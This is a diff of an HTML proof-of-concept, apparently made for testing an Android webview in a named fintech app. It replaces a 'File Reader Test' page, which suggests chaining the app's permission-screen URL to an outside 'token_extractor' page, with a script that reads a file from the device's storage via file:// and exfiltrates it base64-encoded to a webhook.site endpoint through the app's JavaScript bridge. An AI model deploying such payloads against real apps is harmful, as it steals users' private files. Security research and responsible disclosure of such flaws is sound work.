@@ -1,65 +1,12 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>File Reader Test</title>
-    <meta charset="UTF-8">
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            padding: 20px;
-            background-color: #000;
-            color: #00ff00;
-        }
-        .result {
-            background-color: #111;
-            border: 2px solid #ff0000;
-            padding: 15px;
-            margin: 15px 0;
-            border-radius: 5px;
-        }
-        pre {
-            background-color: #222;
-            color: #fff;
-            padding: 10px;
-            border-radius: 3px;
-            overflow-x: auto;
-            white-space: pre-wrap;
-        }
-    </style>
-</head>
-<body>
-    <h1>🔓 File Reader Test</h1>
-
-    <script>
-        // Check URL parameters
-        const urlParams = new URLSearchParams(window.location.search);
-        const isHtmlView = urlParams.get('isHtmlView');
-        const htmlFilePath = urlParams.get('htmlFilePath');
-        
-        document.write(`<div class="result">`);
-        document.write(`<h2>📋 URL Analysis</h2>`);
-        document.write(`<p><strong>Current URL:</strong> ${window.location.href}</p>`);
-        document.write(`<p><strong>isHtmlView:</strong> ${isHtmlView}</p>`);
-        document.write(`<p><strong>htmlFilePath:</strong> ${htmlFilePath}</p>`);
-        document.write(`</div>`);
-        
-        if (isHtmlView === 'true' && htmlFilePath) {
-            document.write(`<div class="result">`);
-            document.write(`<h2>🎯 FILE READ ATTEMPT</h2>`);
-            document.write(`<p>Attempting to read: <code>${htmlFilePath}</code></p>`);
-            document.write(`<p>If the file exists and is readable, its contents should appear below:</p>`);
-            document.write(`<hr>`);
-            document.write(`</div>`);
-            
-            // The webview should load the file content here if htmlFilePath works
-            console.log(`Attempting to read file: ${htmlFilePath}`);
-        } else {
-            document.write(`<div class="result">`);
-            document.write(`<h2>❌ No File Read Parameters</h2>`);
-            document.write(`<p>To test file reading, use this URL format:</p>`);
-            document.write(`<pre>https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/token_extractor.html?isHtmlView=true%26htmlFilePath=[ENCODED_FILE_PATH]</pre>`);
-            document.write(`</div>`);
-        }
-    </script>
-</body>
-</html>
+<script>
+// Read sensitive files via file:// URLs (if allowFileAccess=true)
+fetch('file:///sdcard/Download/WTF.txt')
+  .then(response => response.text())
+  .then(data => {
+    // Exfiltrate via JavaScript interface
+    AndroidJSI.onReceiveMessage(JSON.stringify({
+      action: "EXTERNAL_AP_LINK",
+      data: { deeplinkUrl: "https://webhook.site/fbdb0ab2-a110-4279-b4f0-be2da7cb6332?xx=" + btoa(data) }
+    }));
+  });
+</script>
